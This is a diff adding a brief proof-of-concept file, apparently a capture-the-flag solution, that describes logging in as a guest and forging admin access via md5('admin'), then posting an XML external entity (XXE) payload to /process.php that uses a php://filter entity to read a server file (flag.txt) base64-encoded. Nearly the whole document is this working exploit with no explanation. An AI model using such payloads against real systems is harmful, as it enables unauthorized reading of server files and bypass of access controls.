@@ -1,0 +1,11 @@
+# PoC
+
+- Login with guest, bypass2admin = md5(admin)
+- Post payload to api /process.php
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/flag.txt"> ]>
+<root>
+    <name>&xxe;</name>
+    <email>test@gmail.com</email>
+</root>
